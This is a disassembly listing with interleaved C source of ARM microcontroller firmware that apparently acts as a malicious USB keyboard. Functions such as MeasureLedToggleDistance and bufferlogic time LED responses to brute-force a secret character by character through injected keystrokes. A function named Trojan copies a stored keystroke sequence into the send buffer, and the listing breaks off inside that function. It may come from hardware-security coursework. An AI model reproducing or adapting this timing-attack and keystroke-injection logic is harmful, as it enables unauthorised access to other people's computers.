
build/main.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         00006a80  08000000  0c000000  00010000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 Stack         00000800  10000000  10000000  00030000  2**0
                  ALLOC
  2 .ram_code     00000000  10000800  10000800  00020640  2**0
                  CONTENTS
  3 PSRAM_DATA    00000000  10000800  10000800  00020640  2**0
                  CONTENTS
  4 PSRAM_BSS     00000000  10000800  10000800  00020640  2**0
                  CONTENTS
  5 .data         00000640  20000000  0c006a80  00020000  2**3
                  CONTENTS, ALLOC, LOAD, DATA
  6 .bss          00000668  20000640  0c0070c0  00020640  2**2
                  ALLOC
  7 .no_init      00000014  2000ffc0  2000ffc0  0002ffc0  2**2
                  ALLOC
  8 DSRAM2_DATA   00000000  30000000  30000000  00020640  2**0
                  CONTENTS
  9 DSRAM2_BSS    00000e00  30000000  0c0070c0  00030000  2**2
                  ALLOC
 10 .debug_aranges 000008f8  00000000  00000000  00020640  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 11 .debug_info   0001022a  00000000  00000000  00020f38  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 12 .debug_abbrev 0000248d  00000000  00000000  00031162  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 13 .debug_line   0000d340  00000000  00000000  000335ef  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_frame  00002330  00000000  00000000  00040930  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_str    00083704  00000000  00000000  00042c60  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_loc    00004938  00000000  00000000  000c6364  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_ranges 000007e0  00000000  00000000  000cac9c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .build_attributes 00000474  00000000  00000000  000cb47c  2**0
                  CONTENTS, READONLY
 19 .debug_macro  0001cd25  00000000  00000000  000cb8f0  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

08000000 <__Vectors>:
 8000000:	00 08 00 10 01 02 00 08 b1 02 00 08 b1 02 00 08     ................
 8000010:	b1 02 00 08 b1 02 00 08 b1 02 00 08 00 00 00 00     ................
	...
 800002c:	b1 02 00 08 b1 02 00 08 00 00 00 00 b1 02 00 08     ................
 800003c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800004c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800005c:	b1 02 00 08 b1 02 00 08 00 00 00 00 00 00 00 00     ................
 800006c:	00 00 00 00 b1 02 00 08 00 00 00 00 b1 02 00 08     ................
 800007c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800008c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800009c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80000ac:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80000bc:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80000cc:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80000dc:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80000ec:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80000fc:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800010c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800011c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800012c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800013c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800014c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800015c:	b1 02 00 08 00 00 00 00 00 00 00 00 00 00 00 00     ................
 800016c:	00 00 00 00 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800017c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800018c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 800019c:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80001ac:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80001bc:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80001cc:	b1 02 00 08 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80001dc:	00 00 00 00 b1 02 00 08 b1 02 00 08 b1 02 00 08     ................
 80001ec:	79 0a 00 08 b1 02 00 08 00 00 00 00 b1 02 00 08     y...............
 80001fc:	00 00 00 00                                         ....

08000200 <Reset_Handler>:
 8000200:	f8df d08c 	ldr.w	sp, [pc, #140]	; 8000290 <__zero_table_end__>
 8000204:	4823      	ldr	r0, [pc, #140]	; (8000294 <__zero_table_end__+0x4>)
 8000206:	4780      	blx	r0
 8000208:	4c23      	ldr	r4, [pc, #140]	; (8000298 <__zero_table_end__+0x8>)
 800020a:	4d24      	ldr	r5, [pc, #144]	; (800029c <__zero_table_end__+0xc>)
 800020c:	42ac      	cmp	r4, r5
 800020e:	da09      	bge.n	8000224 <Reset_Handler+0x24>
 8000210:	6821      	ldr	r1, [r4, #0]
 8000212:	6862      	ldr	r2, [r4, #4]
 8000214:	68a3      	ldr	r3, [r4, #8]
 8000216:	3b04      	subs	r3, #4
 8000218:	bfa2      	ittt	ge
 800021a:	58c8      	ldrge	r0, [r1, r3]
 800021c:	50d0      	strge	r0, [r2, r3]
 800021e:	e7fa      	bge.n	8000216 <Reset_Handler+0x16>
 8000220:	340c      	adds	r4, #12
 8000222:	e7f3      	b.n	800020c <Reset_Handler+0xc>
 8000224:	4b1e      	ldr	r3, [pc, #120]	; (80002a0 <__zero_table_end__+0x10>)
 8000226:	4c1f      	ldr	r4, [pc, #124]	; (80002a4 <__zero_table_end__+0x14>)
 8000228:	42a3      	cmp	r3, r4
 800022a:	da08      	bge.n	800023e <Reset_Handler+0x3e>
 800022c:	6819      	ldr	r1, [r3, #0]
 800022e:	685a      	ldr	r2, [r3, #4]
 8000230:	2000      	movs	r0, #0
 8000232:	3a04      	subs	r2, #4
 8000234:	bfa4      	itt	ge
 8000236:	5088      	strge	r0, [r1, r2]
 8000238:	e7fb      	bge.n	8000232 <Reset_Handler+0x32>
 800023a:	3308      	adds	r3, #8
 800023c:	e7f4      	b.n	8000228 <Reset_Handler+0x28>
 800023e:	481a      	ldr	r0, [pc, #104]	; (80002a8 <__zero_table_end__+0x18>)
 8000240:	4780      	blx	r0
 8000242:	481a      	ldr	r0, [pc, #104]	; (80002ac <__zero_table_end__+0x1c>)
 8000244:	4780      	blx	r0
	...

08000248 <__copy_table_start__>:
 8000248:	0c006a80 	.word	0x0c006a80
 800024c:	20000000 	.word	0x20000000
 8000250:	00000640 	.word	0x00000640
 8000254:	0c0070c0 	.word	0x0c0070c0
 8000258:	30000000 	.word	0x30000000
 800025c:	00000000 	.word	0x00000000
 8000260:	0c006a80 	.word	0x0c006a80
 8000264:	10000800 	.word	0x10000800
 8000268:	00000000 	.word	0x00000000
 800026c:	0c006a80 	.word	0x0c006a80
 8000270:	10000800 	.word	0x10000800
 8000274:	00000000 	.word	0x00000000

08000278 <__copy_table_end__>:
 8000278:	20000640 	.word	0x20000640
 800027c:	00000668 	.word	0x00000668
 8000280:	30000000 	.word	0x30000000
 8000284:	00000e00 	.word	0x00000e00
 8000288:	10000800 	.word	0x10000800
 800028c:	00000000 	.word	0x00000000

08000290 <__zero_table_end__>:
 8000290:	10000800 	.word	0x10000800
 8000294:	08006275 	.word	0x08006275
 8000298:	08000248 	.word	0x08000248
 800029c:	08000278 	.word	0x08000278
 80002a0:	08000278 	.word	0x08000278
 80002a4:	08000290 	.word	0x08000290
 80002a8:	08006681 	.word	0x08006681
 80002ac:	080005c1 	.word	0x080005c1

080002b0 <BusFault_Handler>:
 80002b0:	e7fe      	b.n	80002b0 <BusFault_Handler>

080002b2 <XMC_GPIO_SetOutputHigh>:
 * Register Pn_OMR is virtual and does not contain any flip-flop. A read action delivers the value of 0.
 *
 */

__STATIC_INLINE void XMC_GPIO_SetOutputHigh(XMC_GPIO_PORT_t *const port, const uint8_t pin)
{
 80002b2:	b480      	push	{r7}
 80002b4:	b083      	sub	sp, #12
 80002b6:	af00      	add	r7, sp, #0
 80002b8:	6078      	str	r0, [r7, #4]
 80002ba:	460b      	mov	r3, r1
 80002bc:	70fb      	strb	r3, [r7, #3]
  XMC_ASSERT("XMC_GPIO_SetOutputHigh: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));

  port->OMR = (uint32_t)0x1U << pin;
 80002be:	78fb      	ldrb	r3, [r7, #3]
 80002c0:	2201      	movs	r2, #1
 80002c2:	409a      	lsls	r2, r3
 80002c4:	687b      	ldr	r3, [r7, #4]
 80002c6:	605a      	str	r2, [r3, #4]
}
 80002c8:	bf00      	nop
 80002ca:	370c      	adds	r7, #12
 80002cc:	46bd      	mov	sp, r7
 80002ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 80002d2:	4770      	bx	lr

080002d4 <XMC_GPIO_SetOutputLow>:
 * Register Pn_OMR is virtual and does not contain any flip-flop. A read action delivers the value of 0.\n
 *
 */

__STATIC_INLINE void XMC_GPIO_SetOutputLow(XMC_GPIO_PORT_t *const port, const uint8_t pin)
{
 80002d4:	b480      	push	{r7}
 80002d6:	b083      	sub	sp, #12
 80002d8:	af00      	add	r7, sp, #0
 80002da:	6078      	str	r0, [r7, #4]
 80002dc:	460b      	mov	r3, r1
 80002de:	70fb      	strb	r3, [r7, #3]
  XMC_ASSERT("XMC_GPIO_SetOutputLow: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));

  port->OMR = 0x10000U << pin;
 80002e0:	78fb      	ldrb	r3, [r7, #3]
 80002e2:	f44f 3280 	mov.w	r2, #65536	; 0x10000
 80002e6:	409a      	lsls	r2, r3
 80002e8:	687b      	ldr	r3, [r7, #4]
 80002ea:	605a      	str	r2, [r3, #4]
}
 80002ec:	bf00      	nop
 80002ee:	370c      	adds	r7, #12
 80002f0:	46bd      	mov	sp, r7
 80002f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80002f6:	4770      	bx	lr

080002f8 <insertKeydata>:
// uint32_t GetTick(void) {
//     return msTicks;
// }

// Insert for Keydata arrays (shifts structs)
void insertKeydata(Keydata arr[], int *size, int index, Keydata value) {
 80002f8:	b480      	push	{r7}
 80002fa:	b087      	sub	sp, #28
 80002fc:	af00      	add	r7, sp, #0
 80002fe:	60f8      	str	r0, [r7, #12]
 8000300:	60b9      	str	r1, [r7, #8]
 8000302:	607a      	str	r2, [r7, #4]
 8000304:	803b      	strh	r3, [r7, #0]
    for (int i = *size; i > index; --i) {
 8000306:	68bb      	ldr	r3, [r7, #8]
 8000308:	681b      	ldr	r3, [r3, #0]
 800030a:	617b      	str	r3, [r7, #20]
 800030c:	e011      	b.n	8000332 <insertKeydata+0x3a>
        arr[i] = arr[i - 1];
 800030e:	697b      	ldr	r3, [r7, #20]
 8000310:	f103 4300 	add.w	r3, r3, #2147483648	; 0x80000000
 8000314:	3b01      	subs	r3, #1
 8000316:	005b      	lsls	r3, r3, #1
 8000318:	68fa      	ldr	r2, [r7, #12]
 800031a:	18d1      	adds	r1, r2, r3
 800031c:	697b      	ldr	r3, [r7, #20]
 800031e:	005b      	lsls	r3, r3, #1
 8000320:	68fa      	ldr	r2, [r7, #12]
 8000322:	4413      	add	r3, r2
 8000324:	461a      	mov	r2, r3
 8000326:	460b      	mov	r3, r1
 8000328:	881b      	ldrh	r3, [r3, #0]
 800032a:	8013      	strh	r3, [r2, #0]
    for (int i = *size; i > index; --i) {
 800032c:	697b      	ldr	r3, [r7, #20]
 800032e:	3b01      	subs	r3, #1
 8000330:	617b      	str	r3, [r7, #20]
 8000332:	697a      	ldr	r2, [r7, #20]
 8000334:	687b      	ldr	r3, [r7, #4]
 8000336:	429a      	cmp	r2, r3
 8000338:	dce9      	bgt.n	800030e <insertKeydata+0x16>
    }
    arr[index] = value;
 800033a:	687b      	ldr	r3, [r7, #4]
 800033c:	005b      	lsls	r3, r3, #1
 800033e:	68fa      	ldr	r2, [r7, #12]
 8000340:	4413      	add	r3, r2
 8000342:	461a      	mov	r2, r3
 8000344:	463b      	mov	r3, r7
 8000346:	881b      	ldrh	r3, [r3, #0]
 8000348:	8013      	strh	r3, [r2, #0]
    (*size)++;
 800034a:	68bb      	ldr	r3, [r7, #8]
 800034c:	681b      	ldr	r3, [r3, #0]
 800034e:	1c5a      	adds	r2, r3, #1
 8000350:	68bb      	ldr	r3, [r7, #8]
 8000352:	601a      	str	r2, [r3, #0]
}
 8000354:	bf00      	nop
 8000356:	371c      	adds	r7, #28
 8000358:	46bd      	mov	sp, r7
 800035a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800035e:	4770      	bx	lr

08000360 <MeasureLedToggleDistance>:


void MeasureLedToggleDistance(void) {
 8000360:	b480      	push	{r7}
 8000362:	af00      	add	r7, sp, #0
        //public_distance = GetTick() - startTime; 
        public_distance = DWT -> CYCCNT - startTime;
 8000364:	4b19      	ldr	r3, [pc, #100]	; (80003cc <MeasureLedToggleDistance+0x6c>)
 8000366:	685b      	ldr	r3, [r3, #4]
 8000368:	4a19      	ldr	r2, [pc, #100]	; (80003d0 <MeasureLedToggleDistance+0x70>)
 800036a:	6812      	ldr	r2, [r2, #0]
 800036c:	1a9b      	subs	r3, r3, r2
 800036e:	4a19      	ldr	r2, [pc, #100]	; (80003d4 <MeasureLedToggleDistance+0x74>)
 8000370:	6013      	str	r3, [r2, #0]
        if (msgiterator > 0 && public_distance > maxtime) {
 8000372:	4b19      	ldr	r3, [pc, #100]	; (80003d8 <MeasureLedToggleDistance+0x78>)
 8000374:	681b      	ldr	r3, [r3, #0]
 8000376:	2b00      	cmp	r3, #0
 8000378:	dd23      	ble.n	80003c2 <MeasureLedToggleDistance+0x62>
 800037a:	4b16      	ldr	r3, [pc, #88]	; (80003d4 <MeasureLedToggleDistance+0x74>)
 800037c:	681b      	ldr	r3, [r3, #0]
 800037e:	4a17      	ldr	r2, [pc, #92]	; (80003dc <MeasureLedToggleDistance+0x7c>)
 8000380:	6812      	ldr	r2, [r2, #0]
 8000382:	4293      	cmp	r3, r2
 8000384:	d91d      	bls.n	80003c2 <MeasureLedToggleDistance+0x62>
            maxtime = public_distance;
 8000386:	4b13      	ldr	r3, [pc, #76]	; (80003d4 <MeasureLedToggleDistance+0x74>)
 8000388:	681b      	ldr	r3, [r3, #0]
 800038a:	461a      	mov	r2, r3
 800038c:	4b13      	ldr	r3, [pc, #76]	; (80003dc <MeasureLedToggleDistance+0x7c>)
 800038e:	601a      	str	r2, [r3, #0]
            solutionLut[solutionlen].Key = keyLut[msgiterator - 1].Key;
 8000390:	4b11      	ldr	r3, [pc, #68]	; (80003d8 <MeasureLedToggleDistance+0x78>)
 8000392:	681b      	ldr	r3, [r3, #0]
 8000394:	1e5a      	subs	r2, r3, #1
 8000396:	4b12      	ldr	r3, [pc, #72]	; (80003e0 <MeasureLedToggleDistance+0x80>)
 8000398:	681b      	ldr	r3, [r3, #0]
 800039a:	4912      	ldr	r1, [pc, #72]	; (80003e4 <MeasureLedToggleDistance+0x84>)
 800039c:	f811 1012 	ldrb.w	r1, [r1, r2, lsl #1]
 80003a0:	4a11      	ldr	r2, [pc, #68]	; (80003e8 <MeasureLedToggleDistance+0x88>)
 80003a2:	f802 1013 	strb.w	r1, [r2, r3, lsl #1]
            solutionLut[solutionlen].Mod = keyLut[msgiterator - 1].Mod;
 80003a6:	4b0c      	ldr	r3, [pc, #48]	; (80003d8 <MeasureLedToggleDistance+0x78>)
 80003a8:	681b      	ldr	r3, [r3, #0]
 80003aa:	3b01      	subs	r3, #1
 80003ac:	4a0c      	ldr	r2, [pc, #48]	; (80003e0 <MeasureLedToggleDistance+0x80>)
 80003ae:	6812      	ldr	r2, [r2, #0]
 80003b0:	490c      	ldr	r1, [pc, #48]	; (80003e4 <MeasureLedToggleDistance+0x84>)
 80003b2:	005b      	lsls	r3, r3, #1
 80003b4:	440b      	add	r3, r1
 80003b6:	7858      	ldrb	r0, [r3, #1]
 80003b8:	490b      	ldr	r1, [pc, #44]	; (80003e8 <MeasureLedToggleDistance+0x88>)
 80003ba:	0053      	lsls	r3, r2, #1
 80003bc:	440b      	add	r3, r1
 80003be:	4602      	mov	r2, r0
 80003c0:	705a      	strb	r2, [r3, #1]
        }
}
 80003c2:	bf00      	nop
 80003c4:	46bd      	mov	sp, r7
 80003c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80003ca:	4770      	bx	lr
 80003cc:	e0001000 	.word	0xe0001000
 80003d0:	20000670 	.word	0x20000670
 80003d4:	2000065c 	.word	0x2000065c
 80003d8:	20000664 	.word	0x20000664
 80003dc:	20000644 	.word	0x20000644
 80003e0:	20000648 	.word	0x20000648
 80003e4:	2000001c 	.word	0x2000001c
 80003e8:	200000dc 	.word	0x200000dc

080003ec <bufferlogic>:


void bufferlogic(void) {
 80003ec:	b580      	push	{r7, lr}
 80003ee:	b082      	sub	sp, #8
 80003f0:	af00      	add	r7, sp, #0

        string2sendLut[current_string_length - 1] = keyLut[msgiterator]; //fill the buffer with the current key to send
 80003f2:	4b29      	ldr	r3, [pc, #164]	; (8000498 <bufferlogic+0xac>)
 80003f4:	681a      	ldr	r2, [r3, #0]
 80003f6:	4b29      	ldr	r3, [pc, #164]	; (800049c <bufferlogic+0xb0>)
 80003f8:	681b      	ldr	r3, [r3, #0]
 80003fa:	3b01      	subs	r3, #1
 80003fc:	4928      	ldr	r1, [pc, #160]	; (80004a0 <bufferlogic+0xb4>)
 80003fe:	4829      	ldr	r0, [pc, #164]	; (80004a4 <bufferlogic+0xb8>)
 8000400:	f830 2012 	ldrh.w	r2, [r0, r2, lsl #1]
 8000404:	f821 2013 	strh.w	r2, [r1, r3, lsl #1]
        string2sendLut[current_string_length] = (Keydata){GERMAN_KEYBOARD_SC_ENTER, 0}; //append enter at the end
 8000408:	4b24      	ldr	r3, [pc, #144]	; (800049c <bufferlogic+0xb0>)
 800040a:	681b      	ldr	r3, [r3, #0]
 800040c:	4a24      	ldr	r2, [pc, #144]	; (80004a0 <bufferlogic+0xb4>)
 800040e:	2128      	movs	r1, #40	; 0x28
 8000410:	f802 1013 	strb.w	r1, [r2, r3, lsl #1]
 8000414:	4a22      	ldr	r2, [pc, #136]	; (80004a0 <bufferlogic+0xb4>)
 8000416:	005b      	lsls	r3, r3, #1
 8000418:	4413      	add	r3, r2
 800041a:	2200      	movs	r2, #0
 800041c:	705a      	strb	r2, [r3, #1]
    
        msgiterator++;
 800041e:	4b1e      	ldr	r3, [pc, #120]	; (8000498 <bufferlogic+0xac>)
 8000420:	681b      	ldr	r3, [r3, #0]
 8000422:	3301      	adds	r3, #1
 8000424:	4a1c      	ldr	r2, [pc, #112]	; (8000498 <bufferlogic+0xac>)
 8000426:	6013      	str	r3, [r2, #0]
    
            if (msgiterator >= msg_len) {
 8000428:	4b1b      	ldr	r3, [pc, #108]	; (8000498 <bufferlogic+0xac>)
 800042a:	681b      	ldr	r3, [r3, #0]
 800042c:	2b5b      	cmp	r3, #91	; 0x5b
 800042e:	dd2c      	ble.n	800048a <bufferlogic+0x9e>
            
                insertKeydata(string2sendLut, &current_string_length, solution_paste_index, solutionLut[solutionlen]); //We move the max time solution in index 0 
 8000430:	4b1d      	ldr	r3, [pc, #116]	; (80004a8 <bufferlogic+0xbc>)
 8000432:	6819      	ldr	r1, [r3, #0]
 8000434:	4b1d      	ldr	r3, [pc, #116]	; (80004ac <bufferlogic+0xc0>)
 8000436:	681b      	ldr	r3, [r3, #0]
 8000438:	4a1d      	ldr	r2, [pc, #116]	; (80004b0 <bufferlogic+0xc4>)
 800043a:	f832 2013 	ldrh.w	r2, [r2, r3, lsl #1]
 800043e:	2300      	movs	r3, #0
 8000440:	f362 030f 	bfi	r3, r2, #0, #16
 8000444:	460a      	mov	r2, r1
 8000446:	4915      	ldr	r1, [pc, #84]	; (800049c <bufferlogic+0xb0>)
 8000448:	4815      	ldr	r0, [pc, #84]	; (80004a0 <bufferlogic+0xb4>)
 800044a:	f7ff ff55 	bl	80002f8 <insertKeydata>
                string2sendLut[current_string_length] = (Keydata){GERMAN_KEYBOARD_SC_ENTER, 0}; //append enter at the end
 800044e:	4b13      	ldr	r3, [pc, #76]	; (800049c <bufferlogic+0xb0>)
 8000450:	681b      	ldr	r3, [r3, #0]
 8000452:	4a13      	ldr	r2, [pc, #76]	; (80004a0 <bufferlogic+0xb4>)
 8000454:	2128      	movs	r1, #40	; 0x28
 8000456:	f802 1013 	strb.w	r1, [r2, r3, lsl #1]
 800045a:	4a11      	ldr	r2, [pc, #68]	; (80004a0 <bufferlogic+0xb4>)
 800045c:	005b      	lsls	r3, r3, #1
 800045e:	4413      	add	r3, r2
 8000460:	2200      	movs	r2, #0
 8000462:	705a      	strb	r2, [r3, #1]
                string_index = 0;
 8000464:	4b13      	ldr	r3, [pc, #76]	; (80004b4 <bufferlogic+0xc8>)
 8000466:	2200      	movs	r2, #0
 8000468:	601a      	str	r2, [r3, #0]
                solutionlen++;
 800046a:	4b10      	ldr	r3, [pc, #64]	; (80004ac <bufferlogic+0xc0>)
 800046c:	681b      	ldr	r3, [r3, #0]
 800046e:	3301      	adds	r3, #1
 8000470:	4a0e      	ldr	r2, [pc, #56]	; (80004ac <bufferlogic+0xc0>)
 8000472:	6013      	str	r3, [r2, #0]
                solution_paste_index++;
 8000474:	4b0c      	ldr	r3, [pc, #48]	; (80004a8 <bufferlogic+0xbc>)
 8000476:	681b      	ldr	r3, [r3, #0]
 8000478:	3301      	adds	r3, #1
 800047a:	4a0b      	ldr	r2, [pc, #44]	; (80004a8 <bufferlogic+0xbc>)
 800047c:	6013      	str	r3, [r2, #0]
                msgiterator = 0;
 800047e:	4b06      	ldr	r3, [pc, #24]	; (8000498 <bufferlogic+0xac>)
 8000480:	2200      	movs	r2, #0
 8000482:	601a      	str	r2, [r3, #0]
                maxtime = 0;
 8000484:	4b0c      	ldr	r3, [pc, #48]	; (80004b8 <bufferlogic+0xcc>)
 8000486:	2200      	movs	r2, #0
 8000488:	601a      	str	r2, [r3, #0]
            }  


        string_index = 0; // Restart USB transmission
 800048a:	4b0a      	ldr	r3, [pc, #40]	; (80004b4 <bufferlogic+0xc8>)
 800048c:	2200      	movs	r2, #0
 800048e:	601a      	str	r2, [r3, #0]


}
 8000490:	bf00      	nop
 8000492:	3708      	adds	r7, #8
 8000494:	46bd      	mov	sp, r7
 8000496:	bd80      	pop	{r7, pc}
 8000498:	20000664 	.word	0x20000664
 800049c:	20000014 	.word	0x20000014
 80004a0:	20000140 	.word	0x20000140
 80004a4:	2000001c 	.word	0x2000001c
 80004a8:	20000668 	.word	0x20000668
 80004ac:	20000648 	.word	0x20000648
 80004b0:	200000dc 	.word	0x200000dc
 80004b4:	2000064c 	.word	0x2000064c
 80004b8:	20000644 	.word	0x20000644

080004bc <ResetBufferLogic>:
void ResetBufferLogic(void) {
 80004bc:	b480      	push	{r7}
 80004be:	b083      	sub	sp, #12
 80004c0:	af00      	add	r7, sp, #0

    //Iterate in string2sendLut to reset key and Mod
    for (int i = 0; i < 40; i++) {
 80004c2:	2300      	movs	r3, #0
 80004c4:	607b      	str	r3, [r7, #4]
 80004c6:	e00d      	b.n	80004e4 <ResetBufferLogic+0x28>
        string2sendLut[i].Key = 0;
 80004c8:	4a1f      	ldr	r2, [pc, #124]	; (8000548 <ResetBufferLogic+0x8c>)
 80004ca:	687b      	ldr	r3, [r7, #4]
 80004cc:	2100      	movs	r1, #0
 80004ce:	f802 1013 	strb.w	r1, [r2, r3, lsl #1]
        string2sendLut[i].Mod = 0;
 80004d2:	4a1d      	ldr	r2, [pc, #116]	; (8000548 <ResetBufferLogic+0x8c>)
 80004d4:	687b      	ldr	r3, [r7, #4]
 80004d6:	005b      	lsls	r3, r3, #1
 80004d8:	4413      	add	r3, r2
 80004da:	2200      	movs	r2, #0
 80004dc:	705a      	strb	r2, [r3, #1]
    for (int i = 0; i < 40; i++) {
 80004de:	687b      	ldr	r3, [r7, #4]
 80004e0:	3301      	adds	r3, #1
 80004e2:	607b      	str	r3, [r7, #4]
 80004e4:	687b      	ldr	r3, [r7, #4]
 80004e6:	2b27      	cmp	r3, #39	; 0x27
 80004e8:	ddee      	ble.n	80004c8 <ResetBufferLogic+0xc>
    }
    for (int i = 0; i < 25; i++) {
 80004ea:	2300      	movs	r3, #0
 80004ec:	603b      	str	r3, [r7, #0]
 80004ee:	e00d      	b.n	800050c <ResetBufferLogic+0x50>
        solutionLut[i].Key = 0;
 80004f0:	4a16      	ldr	r2, [pc, #88]	; (800054c <ResetBufferLogic+0x90>)
 80004f2:	683b      	ldr	r3, [r7, #0]
 80004f4:	2100      	movs	r1, #0
 80004f6:	f802 1013 	strb.w	r1, [r2, r3, lsl #1]
        solutionLut[i].Mod = 0;
 80004fa:	4a14      	ldr	r2, [pc, #80]	; (800054c <ResetBufferLogic+0x90>)
 80004fc:	683b      	ldr	r3, [r7, #0]
 80004fe:	005b      	lsls	r3, r3, #1
 8000500:	4413      	add	r3, r2
 8000502:	2200      	movs	r2, #0
 8000504:	705a      	strb	r2, [r3, #1]
    for (int i = 0; i < 25; i++) {
 8000506:	683b      	ldr	r3, [r7, #0]
 8000508:	3301      	adds	r3, #1
 800050a:	603b      	str	r3, [r7, #0]
 800050c:	683b      	ldr	r3, [r7, #0]
 800050e:	2b18      	cmp	r3, #24
 8000510:	ddee      	ble.n	80004f0 <ResetBufferLogic+0x34>
    }
    //reset all variables
    string_index = 0;
 8000512:	4b0f      	ldr	r3, [pc, #60]	; (8000550 <ResetBufferLogic+0x94>)
 8000514:	2200      	movs	r2, #0
 8000516:	601a      	str	r2, [r3, #0]
    current_string_length = 1;
 8000518:	4b0e      	ldr	r3, [pc, #56]	; (8000554 <ResetBufferLogic+0x98>)
 800051a:	2201      	movs	r2, #1
 800051c:	601a      	str	r2, [r3, #0]
    characterSent = 0;
 800051e:	4b0e      	ldr	r3, [pc, #56]	; (8000558 <ResetBufferLogic+0x9c>)
 8000520:	2200      	movs	r2, #0
 8000522:	701a      	strb	r2, [r3, #0]
    msgiterator = 0;
 8000524:	4b0d      	ldr	r3, [pc, #52]	; (800055c <ResetBufferLogic+0xa0>)
 8000526:	2200      	movs	r2, #0
 8000528:	601a      	str	r2, [r3, #0]
    maxtime = 0;
 800052a:	4b0d      	ldr	r3, [pc, #52]	; (8000560 <ResetBufferLogic+0xa4>)
 800052c:	2200      	movs	r2, #0
 800052e:	601a      	str	r2, [r3, #0]
    solution_paste_index = 0;
 8000530:	4b0c      	ldr	r3, [pc, #48]	; (8000564 <ResetBufferLogic+0xa8>)
 8000532:	2200      	movs	r2, #0
 8000534:	601a      	str	r2, [r3, #0]
    solutionlen = 0;
 8000536:	4b0c      	ldr	r3, [pc, #48]	; (8000568 <ResetBufferLogic+0xac>)
 8000538:	2200      	movs	r2, #0
 800053a:	601a      	str	r2, [r3, #0]

}
 800053c:	bf00      	nop
 800053e:	370c      	adds	r7, #12
 8000540:	46bd      	mov	sp, r7
 8000542:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000546:	4770      	bx	lr
 8000548:	20000140 	.word	0x20000140
 800054c:	200000dc 	.word	0x200000dc
 8000550:	2000064c 	.word	0x2000064c
 8000554:	20000014 	.word	0x20000014
 8000558:	20000660 	.word	0x20000660
 800055c:	20000664 	.word	0x20000664
 8000560:	20000644 	.word	0x20000644
 8000564:	20000668 	.word	0x20000668
 8000568:	20000648 	.word	0x20000648

0800056c <Trojan>:

void Trojan(void) {
 800056c:	b580      	push	{r7, lr}
 800056e:	af00      	add	r7, sp, #0
    //delay to stabilise
    startTime = 0;
 8000570:	4b0d      	ldr	r3, [pc, #52]	; (80005a8 <Trojan+0x3c>)
 8000572:	2200      	movs	r2, #0
 8000574:	601a      	str	r2, [r3, #0]
    while (startTime < 500000){
 8000576:	e004      	b.n	8000582 <Trojan+0x16>

         startTime++;
 8000578:	4b0b      	ldr	r3, [pc, #44]	; (80005a8 <Trojan+0x3c>)
 800057a:	681b      	ldr	r3, [r3, #0]
 800057c:	3301      	adds	r3, #1
 800057e:	4a0a      	ldr	r2, [pc, #40]	; (80005a8 <Trojan+0x3c>)
 8000580:	6013      	str	r3, [r2, #0]
    while (startTime < 500000){
 8000582:	4b09      	ldr	r3, [pc, #36]	; (80005a8 <Trojan+0x3c>)
 8000584:	681b      	ldr	r3, [r3, #0]
 8000586:	4a09      	ldr	r2, [pc, #36]	; (80005ac <Trojan+0x40>)
 8000588:	4293      	cmp	r3, r2
 800058a:	ddf5      	ble.n	8000578 <Trojan+0xc>
    }

    //ResetBufferLogic();

    memcpy(string2sendLut, trojanInstuctionsLut, trojanLen*sizeof(Keydata));
 800058c:	4b08      	ldr	r3, [pc, #32]	; (80005b0 <Trojan+0x44>)
 800058e:	681b      	ldr	r3, [r3, #0]
 8000590:	005b      	lsls	r3, r3, #1
 8000592:	461a      	mov	r2, r3
 8000594:	4907      	ldr	r1, [pc, #28]	; (80005b4 <Trojan+0x48>)
 8000596:	4808      	ldr	r0, [pc, #32]	; (80005b8 <Trojan+0x4c>)
 8000598:	f006 f8ca 	bl	8006730 <memcpy>
    
    
    string_index = 0;
